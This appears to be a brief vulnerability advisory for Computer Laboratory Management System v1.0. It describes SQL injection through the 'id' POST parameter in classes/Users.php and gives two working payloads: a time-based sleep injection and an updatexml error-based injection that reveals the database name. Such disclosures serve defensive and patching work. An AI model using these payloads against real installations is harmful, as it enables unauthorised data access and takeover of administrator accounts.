# blob
BUG_Author:
K1ngd0m3

Affected version:
Computer Laboratory Management System v1.0

Vendor:
https://www.sourcecodester.com/

Software:
https://www.sourcecodester.com/php/17268/computer-laboratory-management-system-using-php-and-mysql.html

Vulnerability File:
classes/user.php

Description:
computer Laboratory Management System v1.0 is vulnerable to sql injection via /classes/Users.php
The parameter “id” has not been handled correctly. Hackers can exploit this vulnerability to manipulate the system’s administrator account and gain full control over other user accounts’ information.
![image](https://github.com/adminininin/blob/assets/136336674/5a1744cb-e509-4d2a-972c-330d312bcafb)





POST parameter ‘id’ exists SQL injection vulnerability

Payload1:1' and sleep(10)#
![image](https://github.com/adminininin/blob/assets/136336674/d419484c-254b-4441-9b70-b95599a12d2a)
you can see the server sleep ten seconds
Payload2:1'or(updatexml(0,concat(0x5e,database()),0))
![image](https://github.com/adminininin/blob/assets/136336674/f9ccaa05-8542-42f8-8600-1f5128fe7e66)
you can see the db_name
